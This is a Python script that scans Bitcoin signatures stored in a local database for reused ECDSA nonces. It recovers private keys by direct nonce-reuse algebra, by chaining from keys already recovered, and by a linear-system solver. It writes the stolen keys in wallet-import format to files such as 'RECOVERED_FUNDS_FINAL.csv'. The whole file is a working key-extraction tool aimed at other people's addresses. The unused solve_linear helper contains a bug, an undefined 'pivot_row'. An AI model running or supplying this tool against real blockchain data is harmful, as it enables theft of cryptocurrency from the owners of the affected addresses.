import sqlite3, os, sys, math, hashlib, time, argparse, itertools
from collections import defaultdict
from datetime import datetime
from typing import List, Dict, Any, Optional, Tuple, Set

# ==============================================================================
# 1. CONSTANTS & LIBRARY CHECKS
# ==============================================================================

try:
    import ecdsa
    from ecdsa import SECP256k1 as curve
except ImportError:
    print("Error: 'ecdsa' library not found.")
    sys.exit(1)

try:
    import coincurve
    HAS_COINCURVE = True
except ImportError:
    HAS_COINCURVE = False

N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

OUTPUT_DIR     = "reports"
OUTPUT_DB      = os.path.join(OUTPUT_DIR, "scanner.db")
OUTPUT_CSV     = "RECOVERED_FUNDS_FINAL.csv"
OUTPUT_WIF     = os.path.join(OUTPUT_DIR, "wallet_import_keys_final.txt")

DB_CONN = None

# ==============================================================================
# 2. CORE CRYPTO HELPERS
# ==============================================================================

def modinv(a: int, m: int = N) -> int:
    return pow(a, -1, m)

def calc_ripemd160(data: bytes) -> bytes:
    try:
        return hashlib.new('ripemd160', data).digest()
    except ValueError:
        from Crypto.Hash import RIPEMD160
        return RIPEMD160.new(data=data).digest()

def base58_encode(b):
    ALPHA = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    x, out = int.from_bytes(b, "big"), []
    while x > 0: x, rem = divmod(x, 58); out.append(ALPHA[rem])
    for byte in b:
        if byte == 0: out.append("1")
        else: break
    return "".join(reversed(out))

def base58_check(payload):
    chk = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    return base58_encode(payload + chk)

def pub_to_address(pub_hex):
    pub_bytes = bytes.fromhex(pub_hex)
    sha = hashlib.sha256(pub_bytes).digest()
    ripe = calc_ripemd160(sha)
    return base58_check(b"\x00" + ripe)

def verify_key(pub_hex: str, priv_int: int) -> bool:
    if not (0 < priv_int < N): return False
    try:
        d_bytes = priv_int.to_bytes(32, 'big')
        if HAS_COINCURVE:
            pk = coincurve.PrivateKey(d_bytes)
            pubs = [pk.public_key.format(True).hex(), pk.public_key.format(False).hex()]
        else:
            sk = ecdsa.SigningKey.from_secret_exponent(priv_int, curve=curve)
            vk = sk.get_verifying_key()
            pubs = [vk.to_string("compressed").hex(), vk.to_string("uncompressed").hex()]
        return pub_hex.lower() in [p.lower() for p in pubs]
    except: return False

def priv_to_wif(priv_hex, compressed=True):
    payload = bytes.fromhex("80" + priv_hex)
    if compressed: payload += b"\x01"
    return base58_check(payload)

# ==============================================================================
# 3. DB & MATH
# ==============================================================================

def init_db():
    global DB_CONN
    DB_CONN = sqlite3.connect(OUTPUT_DB, check_same_thread=False)
    return DB_CONN

def db_query_r_duplicates():
    return DB_CONN.execute("SELECT r_hex, COUNT(*) FROM signatures GROUP BY r_hex HAVING COUNT(*) >= 2").fetchall()

def db_get_sigs_by_r(r_int):
    r_hex = hex(r_int)[2:].zfill(64)
    cur = DB_CONN.execute("SELECT address, txid, vin_idx, pubkey, s_hex, z_hex FROM signatures WHERE r_hex=?", (r_hex,))
    res = []
    for r in cur.fetchall():
        res.append({"address": r[0], "txid": r[1], "vin_idx": r[2], "pubkey": r[3], "s": int(r[4],16), "z": int(r[5],16) if r[5] and r[5]!="None" else None})
    return res

def solve_linear(matrix, rhs):
    rows, cols = len(matrix), len(matrix[0]) if matrix else 0
    aug = [row[:] + [rhs[i]] for i, row in enumerate(matrix)]
    p_row = 0
    for c in range(cols):
        p = -1
        for rr in range(p_row, rows):
            if aug[rr][c] != 0: p = rr; break
        if p == -1: continue
        aug[p_row], aug[p] = aug[p], aug[p_row]
        try: inv = modinv(aug[p_row][c], N)
        except: return None
        for j in range(c, cols + 1): aug[p_row][j] = (aug[p_row][j] * inv) % N
        for rr in range(pivot_row + 1, rows):
            f = aug[rr][c]
            if f != 0:
                for j in range(c, cols + 1): aug[rr][j] = (aug[rr][j] - f * aug[p_row][j]) % N
        p_row += 1
    sol = [None] * cols
    for rr in range(min(cols, rows)-1, -1, -1):
        lead = next((c for c in range(cols) if aug[rr][c] == 1), -1)
        if lead != -1:
            val = aug[rr][-1]
            for c in range(lead + 1, cols):
                if aug[rr][c] != 0 and sol[c] is not None: val = (val - aug[rr][c] * sol[c]) % N
            sol[lead] = val
    return sol if all(x is not None for x in sol) else None

def solve_cyclic(graph, recovered, method_map, stats):
    sigs, r_vars, p_vars = graph["sigs"], graph["r_vars"], graph["p_vars"]
    if len(sigs) > 14 or all(p in recovered for p in p_vars): return
    cols, r_idx, p_idx = len(r_vars) + len(p_vars), {r: i for i, r in enumerate(r_vars)}, {p: i + len(r_vars) for i, p in enumerate(p_vars)}
    for signs in itertools.product([1, -1], repeat=len(sigs)):
        matrix, rhs = [[0]*cols for _ in range(len(sigs))], [0]*len(sigs)
        for i, s in enumerate(sigs):
            sv = s["s"] if signs[i] == 1 else N - s["s"]
            matrix[i][r_idx[s["r"]]], matrix[i][p_idx[s["pk"]]], rhs[i] = sv, (-s["r"])%N, s["z"]
        # Use an internal local copy of Gaussian solver logic to avoid global pivot_row issue
        rows_m, cols_m = len(matrix), len(matrix[0])
        aug = [row[:] + [rhs[idx_r]] for idx_m, row in enumerate(matrix) for idx_r in [idx_m]]
        p_row = 0
        for c in range(cols_m):
            p = -1
            for rr in range(p_row, rows_m):
                if aug[rr][c] != 0: p = rr; break
            if p == -1: continue
            aug[p_row], aug[p] = aug[p], aug[p_row]
            try: inv = modinv(aug[p_row][c], N)
            except: continue
            for j in range(c, cols_m + 1): aug[p_row][j] = (aug[p_row][j] * inv) % N
            for rr in range(p_row + 1, rows_m):
                f = aug[rr][c]
                if f != 0:
                    for j in range(c, cols_m + 1): aug[rr][j] = (aug[rr][j] - f * aug[p_row][j]) % N
            p_row += 1
        sol = [None] * cols_m
        for rr in range(min(cols_m, rows_m)-1, -1, -1):
            lead = next((c for c in range(cols_m) if aug[rr][c] == 1), -1)
            if lead != -1:
                val = aug[rr][-1]
                for c in range(lead + 1, cols_m):
                    if aug[rr][c] != 0 and sol[c] is not None: val = (val - aug[rr][c] * sol[c]) % N
                sol[lead] = val
        if sol and all(x is not None for x in sol):
            tr = {}
            for p, idx in p_idx.items():
                if p in recovered: continue
                if verify_key(p, sol[idx]): tr[p] = sol[idx]
                else: break
            else:
                if tr:
                    for p, d in tr.items():
                        recovered[p] = d
                        method_map[p] = "matrix_solver"
                        stats["matrix_solver"] += 1
                        print(f"   [MATRIX]        {p[:22]}...")
                    return True
    return False

# ==============================================================================
# 4. ENGINE
# ==============================================================================

def run_recovery():
    r_dups = db_query_r_duplicates()
    if not r_dups: return
    print(f"[-] Loading recovery groups from reports/scanner.db...")
    sigs_all, sigs_by_r, sigs_by_pk = [], defaultdict(list), defaultdict(list)
    for r_h, _ in r_dups:
        r_int = int(r_h, 16)
        for item in db_get_sigs_by_r(r_int):
            if item["z"] is not None:
                s = {"pk": item["pubkey"].lower(), "r": r_int, "s": item["s"], "z": item["z"], "orig_pk": item["pubkey"]}
                sigs_all.append(s); sigs_by_r[s["r"]].append(s); sigs_by_pk[s["pk"]].append(s)

    recovered, method_map, stats = {}, {}, defaultdict(int)
    
    # Extract components
    parent = {}
    def find(i):
        root = i
        while parent.get(root, root) != root: root = parent[root]
        return root
    def union(i, j):
        ri, rj = find(i), find(j)
        if ri != rj: parent[ri] = rj
    r_list, p_list = list(sigs_by_r.keys()), list(sigs_by_pk.keys())
    r_idx, p_idx = {r: i for i, r in enumerate(r_list)}, {p: i + len(r_list) for i, p in enumerate(p_list)}
    for k in range(len(r_list) + len(p_list)): parent[k] = k
    for s in sigs_all: union(r_idx[s["r"]], p_idx[s["pk"]])
    comps = defaultdict(list)
    for p in p_list: comps[find(p_idx[p])].append(p)
    graphs = []
    for r_root, ps in comps.items():
        cs = [s for s in sigs_all if find(p_idx[s["pk"]]) == r_root]
        rs = list({s["r"] for s in cs})
        if len(cs) >= len(rs) + len(ps): graphs.append({"sigs": cs, "r_vars": rs, "p_vars": ps})

    print(f"[-] {len(r_dups)} group(s) loaded from DB.")
    print(f"\n[+] STARTING MASTER WATERFALL RECOVERY LOOP...")
    print("=" * 70)
    
    while True:
        keys_before = len(recovered)
        found_something = True
        while found_something:
            found_something = False
            for pk, entries in sigs_by_pk.items():
                if pk in recovered or len(entries) < 2: continue
                for i, j in itertools.combinations(range(len(entries)), 2):
                    if entries[i]["r"] == entries[j]["r"]:
                        r, s1, z1, s2, z2 = entries[i]["r"], entries[i]["s"], entries[i]["z"], entries[j]["s"], entries[j]["z"]
                        for _s1, _s2 in itertools.product([s1, N-s1], [s2, N-s2]):
                            if _s1 == _s2: continue
                            try:
                                k = ((z1 - z2) * modinv(_s1 - _s2, N)) % N
                                d = ((_s1 * k - z1) * modinv(r, N)) % N
                                if verify_key(pk, d):
                                    recovered[pk], method_map[pk] = d, "bootstrap"
                                    stats["bootstrap"] += 1
                                    print(f"   [BOOTSTRAP]     {pk[:22]}...")
                                    found_something = True; break
                            except: pass
                    if pk in recovered: break
            
            for g in graphs:
                if solve_cyclic(g, recovered, method_map, stats): found_something = True
                
            for r, group in sigs_by_r.items():
                known = [s for s in group if s["pk"] in recovered]
                if known:
                    dk, sk, zk = recovered[known[0]["pk"]], known[0]["s"], known[0]["z"]
                    for s in group:
                        if s["pk"] in recovered: continue
                        for _sk, _st in itertools.product([sk, N-sk], [s["s"], N-s["s"]]):
                            try:
                                k = ((zk + r * dk) * modinv(_sk, N)) % N
                                d = ((_st * k - s["z"]) * modinv(r, N)) % N
                                if verify_key(s["pk"], d):
                                    recovered[s["pk"]], method_map[s["pk"]] = d, "chain"
                                    stats["chain"] += 1
                                    print(f"   [CHAIN]         {s['pk'][:22]}...")
                                    found_something = True; break
                            except: pass
        if len(recovered) == keys_before: break

    # Summary
    print("=" * 70)
    print(f"    {'Method':<28}  {'Count':>6}  {'% of total':>10}")
    print(f"  {'─' * 48}")
    METHODS = [
        ("bootstrap",      "Bootstrap (same-key nonce reuse)"),
        ("chain",          "Chain (derived from known key)"),
        ("matrix_solver",  "Cyclic matrix solver"),
    ]
    for m_id, label in METHODS:
        if stats[m_id] > 0:
            pct = (stats[m_id] / len(recovered)) * 100 if recovered else 0
            print(f"    {label:<28}  {stats[m_id]:>6}  {pct:>9.1f}%")
    print("=" * 70)

    with open(OUTPUT_CSV, "w") as f_csv, open(OUTPUT_WIF, "w") as f_wif:
        f_csv.write("pubkey,address,priv_hex,wif,method\n")
        for pk, d in recovered.items():
            orig_pk = next(s["orig_pk"] for s in sigs_all if s["pk"] == pk)
            meth = method_map.get(pk, "unknown")
            priv_hex = hex(d)[2:].zfill(64)
            wif = priv_to_wif(priv_hex, len(orig_pk)==66)
            f_csv.write(f"{orig_pk},{pub_to_address(orig_pk)},{priv_hex},{wif},{meth}\n")
            f_wif.write(f"{wif}\n")
    
    print(f"  Saved -> {OUTPUT_CSV}")
    print(f"  Saved -> {OUTPUT_WIF}")

if __name__ == "__main__":
    init_db()
    run_recovery()
    if DB_CONN: DB_CONN.close()
